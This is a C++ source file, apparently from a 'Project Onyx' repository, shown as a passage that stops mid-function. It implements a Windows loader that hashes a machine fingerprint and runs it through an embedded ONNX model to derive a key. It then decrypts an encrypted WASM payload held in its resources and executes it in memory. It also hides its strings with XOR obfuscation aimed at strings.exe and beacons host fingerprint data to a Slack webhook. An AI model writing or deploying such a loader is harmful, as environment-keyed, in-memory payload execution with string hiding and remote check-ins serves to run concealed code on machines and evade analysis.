// Project Onyx 
// Author: X-3306
// Project: https://github.com/X-3306/Project-Onyx 
// Phase 1 - Machine fingerprint -> SHA-256
// Phase 2 - Hash -> ONNX model from .rsrc -> metadata vault unlock
// Phase 3 - encrypted WASM from .rsrc -> AES-256-CBC -> raw WASM bytes in RAM
// Phase 4 - Wasm3: host function registration -> module execution from RAM
//
// Host functions exposed to the WASM module:
//   host.get_fingerprint_ptr  () -> i32   ptr to SHA-256 hex copied into WASM memory
//   host.get_fingerprint_len  () -> i32   string length
//   host.get_status_ptr       () -> i32   ptr to status string
//   host.get_status_len       () -> i32   string length
//   host.get_timestamp_ptr    () -> i32   ptr to ISO-8601 timestamp
//   host.get_timestamp_len    () -> i32   string length
//   host.submit_json          (ptr i32, len i32) -> void
//                              WASM passes ready JSON back to the host
//   host.post_teams_json      (ptr i32, len i32) -> i32
//                              host posts JSON synchronously to the configured webhook
//
// Build:
//   Use the repository CMake project

#include <windows.h>
#include <sddl.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <winhttp.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#include <onnxruntime_cxx_api.h>
#include "wasm3.h"
#include "m3_env.h"
#include "resource.h"

#include <string>
#include <vector>
#include <array>
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <ctime>
#include <cstdio>
#include <cstdint>
#include <cctype>
#include <cstdlib>
#include <mutex>
#include <utility>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")

// -----------------------------------------------------------------------------
// Minimal string literal obfuscation. This does not replace cryptography,
// but it limits casual extraction of clear paths/API names with strings.exe.
// -----------------------------------------------------------------------------

template <typename CharT, size_t N, uint32_t Seed>
class XorLiteral
{
public:
    constexpr XorLiteral(const CharT (&plain)[N]) : encrypted_{}
    {
        for (size_t i = 0; i < N; ++i)
            encrypted_[i] = static_cast<CharT>(
                plain[i] ^ static_cast<CharT>((Seed + i * 131u) & 0xFFu));
    }

    std::basic_string<CharT> str() const
    {
        std::basic_string<CharT> out;
        out.resize(N ? N - 1 : 0);
        for (size_t i = 0; i + 1 < N; ++i)
            out[i] = static_cast<CharT>(
                encrypted_[i] ^ static_cast<CharT>((Seed + i * 131u) & 0xFFu));
        return out;
    }

private:
    std::array<CharT, N> encrypted_;
};

#define XOR_A(s) ([] { static constexpr XorLiteral<char, sizeof(s) / sizeof(char), __LINE__> x(s); return x.str(); }())
#define XOR_W(s) ([] { static constexpr XorLiteral<wchar_t, sizeof(s) / sizeof(wchar_t), __LINE__> x(s); return x.str(); }())

// -----------------------------------------------------------------------------
// Host context - safe data exposed read-only to the WASM module.
// Passed through Wasm3 userdata and never exposed as raw native pointers.
// -----------------------------------------------------------------------------

struct HostContext
{
    // Data filled before WASM execution.
    std::string fingerprint;   // SHA-256 hex (64 characters)
    std::string status;        // for example "alive_and_secure"
    std::string timestamp;     // ISO-8601

    // JSON result assembled by the WASM module and received by the host.
    std::string resultJson;
    bool        webhookPosted = false;
    DWORD       webhookStatus = 0;

    // Mutex reserved for future threaded versions.
    std::mutex  resultMutex;
};

// -----------------------------------------------------------------------------
// RAII - BCrypt
// -----------------------------------------------------------------------------

struct AlgGuard
{
    BCRYPT_ALG_HANDLE h = nullptr;
    ~AlgGuard() { if (h) BCryptCloseAlgorithmProvider(h, 0); }
    AlgGuard(const AlgGuard&)            = delete;
    AlgGuard& operator=(const AlgGuard&) = delete;
};

struct HashGuard
{
    BCRYPT_HASH_HANDLE h = nullptr;
    ~HashGuard() { if (h) BCryptDestroyHash(h); }
    HashGuard(const HashGuard&)            = delete;
    HashGuard& operator=(const HashGuard&) = delete;
};

struct KeyGuard
{
    BCRYPT_KEY_HANDLE h = nullptr;
    ~KeyGuard() { if (h) BCryptDestroyKey(h); }
    KeyGuard(const KeyGuard&)            = delete;
    KeyGuard& operator=(const KeyGuard&) = delete;
};

struct HandleGuard
{
    HANDLE h = nullptr;
    ~HandleGuard() { if (h && h != INVALID_HANDLE_VALUE) CloseHandle(h); }
    HandleGuard() = default;
    HandleGuard(const HandleGuard&)            = delete;
    HandleGuard& operator=(const HandleGuard&) = delete;
};

// -----------------------------------------------------------------------------
// RAII - Wasm3
// -----------------------------------------------------------------------------

struct Wasm3EnvGuard
{
    IM3Environment env = nullptr;
    ~Wasm3EnvGuard() { if (env) m3_FreeEnvironment(env); }
    Wasm3EnvGuard() = default;
    Wasm3EnvGuard(const Wasm3EnvGuard&)            = delete;
    Wasm3EnvGuard& operator=(const Wasm3EnvGuard&) = delete;
};

struct Wasm3RuntimeGuard
{
    IM3Runtime rt = nullptr;
    ~Wasm3RuntimeGuard() { if (rt) m3_FreeRuntime(rt); }
    Wasm3RuntimeGuard() = default;
    Wasm3RuntimeGuard(const Wasm3RuntimeGuard&)            = delete;
    Wasm3RuntimeGuard& operator=(const Wasm3RuntimeGuard&) = delete;
};

struct WinHttpHandleGuard
{
    HINTERNET h = nullptr;
    ~WinHttpHandleGuard() { if (h) WinHttpCloseHandle(h); }
    WinHttpHandleGuard() = default;
    WinHttpHandleGuard(const WinHttpHandleGuard&)            = delete;
    WinHttpHandleGuard& operator=(const WinHttpHandleGuard&) = delete;
};

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------

[[noreturn]] static void ThrowWin32(const char* fn, DWORD code = GetLastError())
{
    std::ostringstream oss;
    oss << fn << " failed (0x" << std::hex << std::uppercase
        << std::setw(8) << std::setfill('0') << code << ")";
    throw std::runtime_error(oss.str());
}

[[noreturn]] static void ThrowNT(const char* fn, NTSTATUS st)
{
    ThrowWin32(fn, static_cast<DWORD>(st));
}

// -----------------------------------------------------------------------------
// Timestamp ISO-8601 (UTC)
// -----------------------------------------------------------------------------

static std::string UtcTimestamp()
{
    SYSTEMTIME st{};
    GetSystemTime(&st);

    char buf[32] = {};
    snprintf(buf, sizeof(buf),
             "%04d-%02d-%02dT%02d:%02d:%02dZ",
             st.wYear, st.wMonth,  st.wDay,
             st.wHour, st.wMinute, st.wSecond);
    return std::string(buf);
}

static std::wstring GetEnvVarW(const wchar_t* name)
{
    DWORD needed = GetEnvironmentVariableW(name, nullptr, 0);
    if (needed == 0) return {};

    std::wstring value(needed, L'\0');
    DWORD written = GetEnvironmentVariableW(name, value.data(), needed);
    if (written == 0 || written >= needed)
        ThrowWin32("GetEnvironmentVariableW");

    value.resize(written);
    return value;
}

static std::string JsonEscape(const std::string& input)
{
    std::ostringstream oss;
    oss << std::hex << std::uppercase;

    for (unsigned char ch : input)
    {
        switch (ch)
        {
        case '"':  oss << "\\\""; break;
        case '\\': oss << "\\\\"; break;
        case '\b': oss << "\\b";  break;
        case '\f': oss << "\\f";  break;
        case '\n': oss << "\\n";  break;
        case '\r': oss << "\\r";  break;
        case '\t': oss << "\\t";  break;
        default:
            if (ch < 0x20)
            {
                oss << "\\u"
                    << std::setw(4) << std::setfill('0')
                    << static_cast<unsigned>(ch)
                    << std::setfill(' ');
            }
            else
            {
                oss << static_cast<char>(ch);
            }
            break;
        }
    }

    return oss.str();
}

static std::string LimitWebhookText(const std::string& text, size_t maxLen)
{
    if (text.size() <= maxLen) return text;

    std::string shortened = text.substr(0, maxLen);
    shortened += "... [truncated]";
    return shortened;
}

static void SecureZeroString(std::string& value)
{
    if (!value.empty())
        SecureZeroMemory(value.data(), value.size());
    std::string().swap(value);
}

static void SecureZeroVector(std::vector<uint8_t>& value)
{
    if (!value.empty())
        SecureZeroMemory(value.data(), value.size());
    std::vector<uint8_t>().swap(value);
}

struct SensitiveStringGuard
{
    std::string& value;
    explicit SensitiveStringGuard(std::string& v) : value(v) {}
    ~SensitiveStringGuard() { SecureZeroString(value); }
    SensitiveStringGuard(const SensitiveStringGuard&)            = delete;
    SensitiveStringGuard& operator=(const SensitiveStringGuard&) = delete;
};

struct SensitiveBytesGuard
{
    std::vector<uint8_t>& value;
    explicit SensitiveBytesGuard(std::vector<uint8_t>& v) : value(v) {}
    ~SensitiveBytesGuard() { SecureZeroVector(value); }
    SensitiveBytesGuard(const SensitiveBytesGuard&)            = delete;
    SensitiveBytesGuard& operator=(const SensitiveBytesGuard&) = delete;
};

struct ResourceView
{
    const uint8_t* data = nullptr;
    DWORD         size = 0;
};

static ResourceView LoadResourceView(WORD resourceId)
{
    HMODULE module = GetModuleHandleW(nullptr);
    if (!module)
        ThrowWin32("GetModuleHandleW");

    HRSRC resource = FindResourceW(
        module,
        MAKEINTRESOURCEW(resourceId),
        MAKEINTRESOURCEW(10));
    if (!resource)
        ThrowWin32("FindResourceW");

    HGLOBAL loaded = LoadResource(module, resource);
    if (!loaded)
        ThrowWin32("LoadResource");

    DWORD size = SizeofResource(module, resource);
    const void* data = LockResource(loaded);
    if (!data || size == 0)
        throw std::runtime_error("Resource: empty RCDATA");

    return ResourceView{ reinterpret_cast<const uint8_t*>(data), size };
}

static std::string BuildSlackWebhookPayload(const HostContext& hostCtx)
{
    const std::string fpShort =
        (hostCtx.fingerprint.size() > 20)
            ? (hostCtx.fingerprint.substr(0, 20) + "...")
            : hostCtx.fingerprint;

    const std::string wasmJson =
        LimitWebhookText(hostCtx.resultJson.empty() ? "{}" : hostCtx.resultJson, 12000);

    std::ostringstream oss;
    oss
        << "{"
        << "\"text\":\"Project Onyx heartbeat\","
        << "\"blocks\":["
        << "{\"type\":\"header\",\"text\":{\"type\":\"plain_text\",\"text\":\"Project Onyx heartbeat\"}},"
        << "{\"type\":\"section\",\"fields\":["
        << "{\"type\":\"mrkdwn\",\"text\":\"*Status*\\n" << JsonEscape(hostCtx.status) << "\"},"
        << "{\"type\":\"mrkdwn\",\"text\":\"*Timestamp*\\n" << JsonEscape(hostCtx.timestamp) << "\"},"
        << "{\"type\":\"mrkdwn\",\"text\":\"*Fingerprint*\\n" << JsonEscape(fpShort) << "\"}"
        << "]},"
        << "{\"type\":\"section\",\"text\":{\"type\":\"mrkdwn\",\"text\":\"*WASM JSON*\\n```"
        << JsonEscape(wasmJson) << "```\"}}"
        << "]"
        << "}";

    return oss.str();
}

struct ParsedHttpsUrl
{
    std::wstring host;
    std::wstring pathAndQuery;
    INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
};

static ParsedHttpsUrl ParseHttpsUrl(const std::wstring& url)
{
    URL_COMPONENTS parts{};
    parts.dwStructSize      = sizeof(parts);
    parts.dwSchemeLength    = static_cast<DWORD>(-1);
    parts.dwHostNameLength  = static_cast<DWORD>(-1);
    parts.dwUrlPathLength   = static_cast<DWORD>(-1);
    parts.dwExtraInfoLength = static_cast<DWORD>(-1);

    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &parts))
        ThrowWin32("WinHttpCrackUrl");

    if (parts.nScheme != INTERNET_SCHEME_HTTPS)
        throw std::runtime_error("Webhook: HTTPS URL required");

    if (!parts.lpszHostName || parts.dwHostNameLength == 0)
        throw std::runtime_error("Webhook: URL host is empty");

    ParsedHttpsUrl parsed;
    parsed.host.assign(parts.lpszHostName, parts.dwHostNameLength);
    parsed.port = parts.nPort ? parts.nPort : INTERNET_DEFAULT_HTTPS_PORT;

    if (parts.dwUrlPathLength > 0)
        parsed.pathAndQuery.assign(parts.lpszUrlPath, parts.dwUrlPathLength);
    else
        parsed.pathAndQuery = L"/";

    if (parts.dwExtraInfoLength > 0)
        parsed.pathAndQuery.append(parts.lpszExtraInfo, parts.dwExtraInfoLength);

    return parsed;
}

static DWORD PostJsonToHttps(const std::wstring& url, const std::string& body)
{
    if (body.size() > static_cast<size_t>(0xFFFFFFFFu))
        throw std::runtime_error("Webhook: payload is too large");

    const ParsedHttpsUrl parsed = ParseHttpsUrl(url);

    const std::wstring userAgent = XOR_W(L"ProjectOnyx/1.0");

    WinHttpHandleGuard session;
    session.h = WinHttpOpen(userAgent.c_str(),
                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME,
                            WINHTTP_NO_PROXY_BYPASS,
                            0);
    if (!session.h) ThrowWin32("WinHttpOpen");

    WinHttpSetTimeouts(session.h, 1500, 1500, 3000, 3000);

    WinHttpHandleGuard connection;
    connection.h = WinHttpConnect(session.h, parsed.host.c_str(), parsed.port, 0);
    if (!connection.h) ThrowWin32("WinHttpConnect");

    WinHttpHandleGuard request;
    request.h = WinHttpOpenRequest(connection.h,
                                   L"POST",
                                   parsed.pathAndQuery.c_str(),
                                   nullptr,
                                   WINHTTP_NO_REFERER,
                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
                                   WINHTTP_FLAG_SECURE);
    if (!request.h) ThrowWin32("WinHttpOpenRequest");

    static constexpr wchar_t headers[] =
        L"Content-Type: application/json\r\n"
        L"Accept: application/json\r\n";

    const DWORD bodySize = static_cast<DWORD>(body.size());
    void* bodyPtr = body.empty()
        ? WINHTTP_NO_REQUEST_DATA
        : const_cast<char*>(body.data());

    if (!WinHttpSendRequest(request.h,
                            headers,
                            static_cast<DWORD>(-1),
                            bodyPtr,
                            bodySize,
                            bodySize,
                            0))
        ThrowWin32("WinHttpSendRequest");

    if (!WinHttpReceiveResponse(request.h, nullptr))
        ThrowWin32("WinHttpReceiveResponse");

    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    if (!WinHttpQueryHeaders(request.h,
                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX,
                             &statusCode,
                             &statusSize,
                             WINHTTP_NO_HEADER_INDEX))
        ThrowWin32("WinHttpQueryHeaders(STATUS_CODE)");

    if (statusCode < 200 || statusCode >= 300)
    {
        std::ostringstream oss;
        oss << "Webhook HTTP " << statusCode;
        throw std::runtime_error(oss.str());
    }

    return statusCode;
}

static std::wstring ResolveSlackWebhookUrl()
{
    const std::wstring envName = XOR_W(L"PROJECT_ONYX_SLACK_WEBHOOK_URL");
    const std::wstring envValue = GetEnvVarW(envName.c_str());
    if (!envValue.empty())
        return envValue;

    const std::wstring legacyEnvName = XOR_W(L"DIAGNOSTICS_SLACK_WEBHOOK_URL");
    const std::wstring legacyEnvValue = GetEnvVarW(legacyEnvName.c_str());
    if (!legacyEnvValue.empty())
        return legacyEnvValue;

    // For public builds, prefer PROJECT_ONYX_SLACK_WEBHOOK_URL.
    // Replace this only in private lab builds if an embedded webhook is required.
    const std::wstring embeddedSlackWebhookUrl = XOR_W(L"");
    if (!embeddedSlackWebhookUrl.empty())
        return embeddedSlackWebhookUrl;

    // Teams alternative kept disabled:
    // const std::wstring teamsEnvName = XOR_W(L"DIAGNOSTICS_TEAMS_WEBHOOK_URL");
    // return GetEnvVarW(teamsEnvName.c_str());

    return std::wstring();
}

static DWORD PostSlackHeartbeat(
    HostContext& hostCtx,
    const std::string* wasmPayload = nullptr)
{
    const std::wstring webhookUrl = ResolveSlackWebhookUrl();
    if (webhookUrl.empty())
        return 0;

    std::string payload;
    if (wasmPayload)
    {
        std::lock_guard<std::mutex> lock(hostCtx.resultMutex);
        hostCtx.resultJson = *wasmPayload;
        payload = BuildSlackWebhookPayload(hostCtx);
    }
    else
    {
        std::lock_guard<std::mutex> lock(hostCtx.resultMutex);
        payload = BuildSlackWebhookPayload(hostCtx);
    }

    const DWORD status = PostJsonToHttps(webhookUrl, payload);
    SecureZeroString(payload);

    {
        std::lock_guard<std::mutex> lock(hostCtx.resultMutex);
        hostCtx.webhookPosted = true;
        hostCtx.webhookStatus = status;
    }

    return status;
}

// -----------------------------------------------------------------------------
// Phase 1a - MachineGuid
// -----------------------------------------------------------------------------

static std::wstring GetMachineGuid()
{
    HKEY hKey = nullptr;
    const std::wstring cryptographyKey = XOR_W(L"SOFTWARE\\Microsoft\\Cryptography");
    const std::wstring machineGuidName = XOR_W(L"MachineGuid");

    LONG res = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        cryptographyKey.c_str(),
        0, KEY_READ | KEY_WOW64_64KEY, &hKey);

    if (res != ERROR_SUCCESS)
        ThrowWin32("RegOpenKeyExW(Cryptography)", static_cast<DWORD>(res));

    struct RegGuard { HKEY k; ~RegGuard() { RegCloseKey(k); } } guard{ hKey };

    wchar_t value[128] = {};
    DWORD cbValue = sizeof(value);
    DWORD type    = 0;

    res = RegQueryValueExW(hKey, machineGuidName.c_str(), nullptr, &type,
                           reinterpret_cast<LPBYTE>(value), &cbValue);

    if (res != ERROR_SUCCESS)
        ThrowWin32("RegQueryValueExW", static_cast<DWORD>(res));

    if (type != REG_SZ && type != REG_EXPAND_SZ)
        throw std::runtime_error("Registry value: unexpected type");

    value[127] = L'\0';
    return std::wstring(value);
}

// -----------------------------------------------------------------------------
// Phase 1b - C: volume serial
// -----------------------------------------------------------------------------

static std::wstring GetVolumeSerial()
{
    DWORD serial = 0;
    const std::wstring root = XOR_W(L"C:\\");
    if (!GetVolumeInformationW(root.c_str(), nullptr, 0, &serial,
                               nullptr, nullptr, nullptr, 0))
        ThrowWin32("GetVolumeInformationW");

    wchar_t buf[16] = {};
    swprintf_s(buf, L"%08X", serial);
    return std::wstring(buf);
}

// -----------------------------------------------------------------------------
// Phase 1c - User SID from the process token, without HKLM\SAM access.
// -----------------------------------------------------------------------------

static std::wstring GetCurrentUserSid()
{
    HandleGuard token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token.h))
        return L"NO_TOKEN_ACCESS";

    DWORD cbToken = 0;
    GetTokenInformation(token.h, TokenUser, nullptr, 0, &cbToken);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || cbToken == 0)
        return L"TOKEN_USER_UNREADABLE";

    std::vector<BYTE> buffer(cbToken);
    if (!GetTokenInformation(token.h, TokenUser, buffer.data(), cbToken, &cbToken))
        return L"TOKEN_USER_UNREADABLE";

    TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(buffer.data());
    LPWSTR sidText = nullptr;
    if (!ConvertSidToStringSidW(tokenUser->User.Sid, &sidText))
        return L"SID_CONVERT_FAILED";

    std::wstring result(sidText);
    LocalFree(sidText);
    return result;
}

// -----------------------------------------------------------------------------
// UTF-16 - UTF-8
// -----------------------------------------------------------------------------

static std::string WideToUtf8(const std::wstring& w)
{
    if (w.empty()) return {};

    int needed = WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS,
                                     w.c_str(), static_cast<int>(w.size()),
                                     nullptr, 0, nullptr, nullptr);
    if (needed <= 0) ThrowWin32("WideCharToMultiByte(probe)");

    std::string result(static_cast<size_t>(needed), '\0');
    int written = WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS,
                                      w.c_str(), static_cast<int>(w.size()),
                                      result.data(), needed, nullptr, nullptr);
    if (written <= 0) ThrowWin32("WideCharToMultiByte(convert)");
    return result;
}

// -----------------------------------------------------------------------------
// SHA-256 (BCrypt)
// -----------------------------------------------------------------------------

static std::string Sha256(const std::string& input)
{
    AlgGuard  alg{};
    HashGuard hash{};
    DWORD objLen = 0, hashLen = 0, cbData = 0;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&alg.h, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptOpenAlgorithmProvider", st);

    st = BCryptGetProperty(alg.h, BCRYPT_OBJECT_LENGTH,
                           reinterpret_cast<PUCHAR>(&objLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(OBJECT_LENGTH)", st);

    st = BCryptGetProperty(alg.h, BCRYPT_HASH_LENGTH,
                           reinterpret_cast<PUCHAR>(&hashLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(HASH_LENGTH)", st);

    std::vector<BYTE> objBuf(objLen), hashBuf(hashLen);

    st = BCryptCreateHash(alg.h, &hash.h, objBuf.data(), objLen,
                          nullptr, 0, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptCreateHash", st);

    if (!input.empty())
    {
        st = BCryptHashData(
            hash.h,
            reinterpret_cast<PUCHAR>(const_cast<char*>(input.data())),
            static_cast<ULONG>(input.size()), 0);
        if (!NT_SUCCESS(st)) ThrowNT("BCryptHashData", st);
    }

    st = BCryptFinishHash(hash.h, hashBuf.data(), hashLen, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptFinishHash", st);

    std::ostringstream oss;
    for (BYTE b : hashBuf)
        oss << std::hex << std::setw(2) << std::setfill('0')
            << static_cast<int>(b);
    return oss.str();
}

static std::vector<uint8_t> Sha256Bytes(const std::string& input)
{
    AlgGuard  alg{};
    HashGuard hash{};
    DWORD objLen = 0, hashLen = 0, cbData = 0;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&alg.h, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptOpenAlgorithmProvider", st);

    st = BCryptGetProperty(alg.h, BCRYPT_OBJECT_LENGTH,
                           reinterpret_cast<PUCHAR>(&objLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(OBJECT_LENGTH)", st);

    st = BCryptGetProperty(alg.h, BCRYPT_HASH_LENGTH,
                           reinterpret_cast<PUCHAR>(&hashLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(HASH_LENGTH)", st);

    std::vector<BYTE> objBuf(objLen);
    std::vector<uint8_t> hashBuf(hashLen);

    st = BCryptCreateHash(alg.h, &hash.h, objBuf.data(), objLen,
                          nullptr, 0, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptCreateHash", st);

    if (!input.empty())
    {
        st = BCryptHashData(
            hash.h,
            reinterpret_cast<PUCHAR>(const_cast<char*>(input.data())),
            static_cast<ULONG>(input.size()), 0);
        if (!NT_SUCCESS(st)) ThrowNT("BCryptHashData", st);
    }

    st = BCryptFinishHash(hash.h, hashBuf.data(), hashLen, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptFinishHash", st);

    return hashBuf;
}

static std::vector<uint8_t> HexDecode(const std::string& hex)
{
    if ((hex.size() % 2) != 0)
        throw std::runtime_error("hex decode: odd length");

    auto hexValue = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
        if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
        return -1;
    };

    std::vector<uint8_t> out;
    out.reserve(hex.size() / 2);
    for (size_t i = 0; i < hex.size(); i += 2)
    {
        const int hi = hexValue(hex[i]);
        const int lo = hexValue(hex[i + 1]);
        if (hi < 0 || lo < 0)
            throw std::runtime_error("hex decode: invalid character");
        out.push_back(static_cast<uint8_t>((hi << 4) | lo));
    }
    return out;
}

static std::vector<uint8_t> Base64Decode(const std::string& encoded)
{
    DWORD required = 0;
    if (!CryptStringToBinaryA(
            encoded.c_str(), static_cast<DWORD>(encoded.size()),
            CRYPT_STRING_BASE64, nullptr, &required, nullptr, nullptr))
        ThrowWin32("CryptStringToBinaryA(probe)");

    std::vector<uint8_t> out(required);
    if (!CryptStringToBinaryA(
            encoded.c_str(), static_cast<DWORD>(encoded.size()),
            CRYPT_STRING_BASE64, out.data(), &required, nullptr, nullptr))
        ThrowWin32("CryptStringToBinaryA(convert)");

    out.resize(required);
    return out;
}

static bool ConstantTimeEqual(
    const std::vector<uint8_t>& a,
    const std::vector<uint8_t>& b)
{
    if (a.size() != b.size())
        return false;

    uint8_t diff = 0;
    for (size_t i = 0; i < a.size(); ++i)
        diff |= static_cast<uint8_t>(a[i] ^ b[i]);
    return diff == 0;
}

static std::vector<uint8_t> HmacSha256(
    const std::vector<uint8_t>& keyBytes,
    const uint8_t* data,
    size_t dataSize)
{
    AlgGuard  alg{};
    HashGuard hash{};
    DWORD objLen = 0, hashLen = 0, cbData = 0;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(
        &alg.h, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptOpenAlgorithmProvider(HMAC-SHA256)", st);

    st = BCryptGetProperty(alg.h, BCRYPT_OBJECT_LENGTH,
                           reinterpret_cast<PUCHAR>(&objLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(HMAC_OBJECT_LENGTH)", st);

    st = BCryptGetProperty(alg.h, BCRYPT_HASH_LENGTH,
                           reinterpret_cast<PUCHAR>(&hashLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(HMAC_HASH_LENGTH)", st);

    std::vector<BYTE> objBuf(objLen);
    std::vector<uint8_t> out(hashLen);

    st = BCryptCreateHash(
        alg.h, &hash.h, objBuf.data(), objLen,
        const_cast<PUCHAR>(keyBytes.data()),
        static_cast<ULONG>(keyBytes.size()), 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptCreateHash(HMAC)", st);

    if (data && dataSize)
    {
        st = BCryptHashData(
            hash.h, const_cast<PUCHAR>(data),
            static_cast<ULONG>(dataSize), 0);
        if (!NT_SUCCESS(st)) ThrowNT("BCryptHashData(HMAC)", st);
    }

    st = BCryptFinishHash(hash.h, out.data(), hashLen, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptFinishHash(HMAC)", st);

    if (!objBuf.empty())
        SecureZeroMemory(objBuf.data(), objBuf.size());
    return out;
}

static std::vector<uint8_t> HmacSha256(
    const std::vector<uint8_t>& keyBytes,
    const std::string& data)
{
    return HmacSha256(
        keyBytes,
        reinterpret_cast<const uint8_t*>(data.data()),
        data.size());
}

static std::vector<uint8_t> Pbkdf2Sha256(
    const std::string& password,
    const std::vector<uint8_t>& salt,
    ULONG iterations)
{
    AlgGuard alg{};
    NTSTATUS st = BCryptOpenAlgorithmProvider(
        &alg.h, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptOpenAlgorithmProvider(PBKDF2)", st);

    std::vector<uint8_t> out(32);
    st = BCryptDeriveKeyPBKDF2(
        alg.h,
        reinterpret_cast<PUCHAR>(const_cast<char*>(password.data())),
        static_cast<ULONG>(password.size()),
        const_cast<PUCHAR>(salt.data()),
        static_cast<ULONG>(salt.size()),
        static_cast<ULONGLONG>(iterations),
        out.data(),
        static_cast<ULONG>(out.size()),
        0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptDeriveKeyPBKDF2", st);
    return out;
}

static std::vector<uint8_t> HkdfSha256(
    const std::vector<uint8_t>& ikm,
    const char* info)
{
    std::vector<uint8_t> zeroSalt(32, 0);
    std::vector<uint8_t> prk = HmacSha256(zeroSalt, ikm.data(), ikm.size());
    SensitiveBytesGuard prkGuard(prk);

    std::vector<uint8_t> block;
    const size_t infoLen = std::strlen(info);
    block.reserve(infoLen + 1);
    block.insert(block.end(), info, info + infoLen);
    block.push_back(0x01);

    std::vector<uint8_t> okm = HmacSha256(prk, block.data(), block.size());
    okm.resize(32);
    SecureZeroVector(block);
    return okm;
}

static std::string LookupOnnxMetadata(
    const Ort::ModelMetadata& metadata,
    OrtAllocator* allocator,
    const char* key)
{
    Ort::AllocatedStringPtr value =
        metadata.LookupCustomMetadataMapAllocated(key, allocator);
    if (!value)
    {
        std::ostringstream oss;
        oss << "Model metadata: missing " << key;
        throw std::runtime_error(oss.str());
    }
    return std::string(value.get());
}

static std::string NormalizeAesKeyMaterial(const std::string& modelOutput)
{
    std::string keyMaterial;
    keyMaterial.reserve(32);

    for (unsigned char c : modelOutput)
    {
        if (std::isalnum(c) || c == '_' || c == '-' || c == '+' || c == '/' || c == '=')
            keyMaterial.push_back(static_cast<char>(c));
        if (keyMaterial.size() == 32)
            break;
    }

    if (keyMaterial.size() < 16)
        throw std::runtime_error("Model: AES key material is too short");

    return keyMaterial;
}

static std::vector<uint8_t> DecryptAes256CbcRawKey(
    const uint8_t* encryptedData,
    DWORD encryptedSize,
    const std::vector<uint8_t>& keyBytes)
{
    if (!encryptedData || encryptedSize <= 16)
        throw std::runtime_error("WASM resource: missing IV or ciphertext");

    if (keyBytes.size() != 32)
        throw std::runtime_error("AES-CBC: raw key must be 32 bytes");

    std::vector<uint8_t> iv(encryptedData, encryptedData + 16);
    std::vector<uint8_t> ivProbe = iv;
    const uint8_t* cipher = encryptedData + 16;
    const ULONG cipherSize = static_cast<ULONG>(encryptedSize - 16);

    AlgGuard alg{};
    KeyGuard key{};
    DWORD objLen = 0, cbData = 0;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&alg.h, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptOpenAlgorithmProvider(AES)", st);

    st = BCryptSetProperty(alg.h, BCRYPT_CHAINING_MODE,
                           reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_CBC)),
                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptSetProperty(CHAIN_MODE_CBC)", st);

    st = BCryptGetProperty(alg.h, BCRYPT_OBJECT_LENGTH,
                           reinterpret_cast<PUCHAR>(&objLen),
                           sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(st)) ThrowNT("BCryptGetProperty(AES_OBJECT_LENGTH)", st);

    std::vector<BYTE> keyObj(objLen);
    st = BCryptGenerateSymmetricKey(
        alg.h, &key.h, keyObj.data(), objLen,
